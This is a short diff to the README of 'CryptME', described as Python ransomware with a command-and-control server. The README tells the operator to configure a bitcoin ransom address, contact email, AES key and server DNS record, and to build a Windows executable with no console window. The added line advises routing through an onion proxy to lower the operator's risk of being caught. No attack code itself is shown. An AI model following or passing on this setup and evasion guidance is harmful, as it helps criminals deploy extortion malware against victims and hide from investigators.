@@ -2,7 +2,7 @@
 CryptME quick and dirty ransomware in python with a C2 Server, currently a work in progress. 
 Apache/Nginx with PHP support.
 
-Adjust main.py and C2 with bitcoin address, contact email, AES key, and DNS A record to reach server. Then build setup.py with py2exe
+Adjust main.py and C2 with bitcoin address, contact email, AES key, and DNS A record to reach server. (Try and use an onion proxy to minimize risk) Then build setup.py with py2exe.
 
 (Recommended to use the params setup(windows=['main.py'], options={"py2exe":{"includes":["sip"]}}) for no console window)
 
